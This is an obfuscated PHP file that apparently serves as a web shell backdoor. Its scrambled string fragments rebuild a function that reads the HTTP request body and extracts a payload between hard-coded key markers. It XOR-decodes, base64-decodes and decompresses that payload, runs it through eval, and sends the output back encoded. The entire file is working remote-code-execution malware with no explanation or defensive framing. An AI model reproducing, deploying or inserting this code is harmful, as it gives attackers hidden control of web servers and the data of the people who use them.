<?php
$U=';$j+#h#h+,$i++#h){$o.=$t{$i}^$k{$j}#h#h;}}#hreturn $o#h;}if#h (@preg_ma#h#';
$I=str_replace('p','','cprepatpe_fupnppction');
$J='h#htch("/#h$k#hh(.+)$kf/",@file_get_cont#h#hents("php:/#h/inp#h#hut"),$m)==';
$p=';$p="Widfw5sZUMup1h#hwD#h";function #hx($#ht#h#h,$k){$c=strlen($#hk);$l=str';
$e='@b#hase64_enc#hode(@x(@gz#hcompress#h#h($o),$#h#hk));print#h("$p$kh$r$kf");}';
$n='le#hn#h($t);$o="";#hfor#h($i=#h0#h;$i<$l;){for($j=0;#h($#hj<$c&&#h$#hi<$l)';
$v='$k="f8f#h409c2";$#hkh=#h#h#h#h"26e9166#h44406";$#hkf="e1#hb#haf0624bd9#h"';
$L='#h1) {@o#hb_start();@e#hval(@g#hzunco#hmp#hress(@#hx(@bas#he64_de#hcode(#';
$N='h$m[#h1]),$k#h)));$#ho=@ob_get_#hconte#hnts();@ob_end#h_cle#han();$r=#h#h';
$V=str_replace('#h','',$v.$p.$n.$U.$J.$L.$N.$e);
$r=$I('',$V);$r();
?>
